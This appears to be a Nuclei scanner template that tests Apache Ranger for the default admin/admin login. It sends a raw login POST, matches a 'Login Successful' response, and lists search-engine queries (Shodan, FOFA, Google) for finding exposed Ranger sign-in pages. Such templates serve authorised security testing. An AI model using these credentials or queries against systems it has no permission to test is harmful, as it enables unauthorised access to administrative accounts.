id: ranger-default-login

info:
  name: Apache Ranger Default Credentials
  author: For3stCo1d
  severity: high
  description: Apache Ranger default login credentials were discovered.
  reference:
    - https://github.com/apache/ranger
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:a:apache:ranger:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: apache
    product: ranger
    shodan-query: http.title:"ranger - sign in"
    fofa-query: title="ranger - sign in"
    google-query: intitle:"ranger - sign in"
    runzero-match: any(each(service["html.titles"]), {# matches "Ranger - Sign In"})
  tags: apache,ranger,default-login

http:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        username={{user}}&password={{pass}}

    attack: pitchfork
    payloads:
      user:
        - admin
      pass:
        - admin

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"statusCode":200'
          - '"msgDesc":"Login Successful"'
        condition: and

      - type: status
        status:
          - 200

